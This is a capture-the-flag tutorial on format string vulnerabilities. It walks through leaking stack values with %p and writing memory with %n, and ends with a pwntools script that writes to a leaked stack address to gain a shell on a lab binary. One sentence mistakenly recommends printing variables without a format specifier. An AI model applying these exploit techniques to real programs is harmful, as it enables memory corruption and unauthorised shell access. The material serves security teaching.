# 2_my_echo

In `2_my_echo`, we will be taking a look at format string vulnerabilities.

Usually when we're taught to use `printf`, we're shown what to do. For example:

- Printing a string literal: `printf("Hello!")` or `printf("%s", "Hello!")`
- Printing an int variable: `printf("%d", num)`
- Printing a char/str variable: `printf("%c", character)`, `printf("%s", str)`

What we should do is print a variable without giving it its proper format specifier.

Example:

```C
// gcc -m32 fmtstr.c -o fmtstr
#include <stdio.h>

void main () {
	char arr[50];

	fgets(arr, 50, stdin);
	printf(arr);
}
```

This is because the behaviour can be undefined behaviours, like so:

```c
% ./fmtstr
Hi!
Hi!

% ./fmtstr
Hello!
Hello!

% ./fmtstr
%p
0xa70
```

Some common format specifiers we usually use are: `%s`, `%c`, `%d`, `%x`, `%f`.\
These are used to print strings, characters, integers, unsigned integers, and floats respectively, there are more out there but these are just a few.\
A lesser known specifier is the `%n` specifier. `%n` can be used to write to memory.

To write to our desired address, we must first find the address we want to write to, and to do that, I'll use the example from above.

```c
% ./fmtstr
AAAA%p%p%p%p%p%p%p%p
AAAA0x320xf7f4e5400x5664e1d4(nil)0xf7f88b700x4141d0340x702541410x70257025

% ./fmtstr
bbAAAA%p%p%p%p%p%p%p%p
bbAAAA0x320xf7eb25400x5664d1d4(nil)0xf7eecb700x6262c0340x414141410x70257025
```

As we saw in the first example output, `%p` outputs the value at the `esp` register.\
`%p%p%p%p` will pop four values from `esp` to `esp - 16` and print it.\
From the first output of the above example, we see that the 6th and 7th popped values are `0x4141d034` and `0x70254141` respectively.\
So in the second one, I pad the `AAAA` with `bb` so that the value `0x41414141` would be aligned, making things easier for me.

We're able to output the values on the stack, so what?\
With this, we can select the argument we want from the stack by its position by using the `$` preceded by its position as an integer.

```c
% ./fmtstr
bbAAAA%p%p%p%p%p%p%p%p
bbAAAA0x320xf7f3b5400x565ac1d4(nil)0xf7f75b700x6262b0340x414141410x70257025
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
                                                       7th position

% ./fmtstr
bbAAAA%7$p
bbAAAA0x41414141
```

So now that we're able to write using the `%n` specifier and reference any address we want, we can combine this to achieve arbitrary writing of memory.\
Let's think about how we would write to a certain address.

1. Our input is stored on the stack, a couple arguments from `esp`
   - We can use the `$` symbol to select a certain argument after finding it by trial and error or if the buffer is large enough, input a lot of `%p`'s
   - With this we can write any address we want and reference it by its position.
2. Writing to said address
   - This is achieved through the `%n` specifier, but we must reference to the address we want while using `%n`
3. Write a specific value to the address
   - The `%n` specifier writes to the address, but it writes the number of characters written beforehand
     - So for example, if we have `printf("AABBCCDD %n", &num)`, `num` will equal to the length of `AABBCCDD `, therefore `num` will hold the value 9.
   - The `%x` specifier will allow us to write as many bytes as we want before using `%n`, `%[num]x`
4. Finally, we combine steps 1, 2 and 3, after that, we will have something like: `[Address]%[NumToWrite]x%[AddrPosition]$n`

Now let's take a took at this binary.

```
% ./2_my_echo
This is my address 0xffd1aa1c
You can come over if you tell me the password.
```

Taking a look at that given address, starting with 0xff usually indicates that it is an address on the stack.\
Looking at the source code, we see that it is the address of the variable `flag` which is never changed by the program and takes executes a `system("/bin/sh")`.

So with what I have explained above, can you construct a payload which uses the concepts previously explained to make the flag variable equal 42?

<details>
   <summary>My Solution</summary>

```python
from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./2_my_echo"

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("address ")
leak = int(p.recvline()[:-1], 16)
print(leak)
log.info(str(leak))

# using the pwntools `fmtstr_payload` function
payload = fmtstr_payload(7, {leak: 1})

# manual payload
# i recommend learning how to manually create the payload
# as it'll familiarise you with how the payloads for these attacks work

# payload = [flagAddr] + %38x + %7$n
#            4 bytes   + 38 bytes = 42 bytes
payload = pack(leak) + b"%38x%7$n"
p.sendline(payload)

p.interactive()
```

</details>
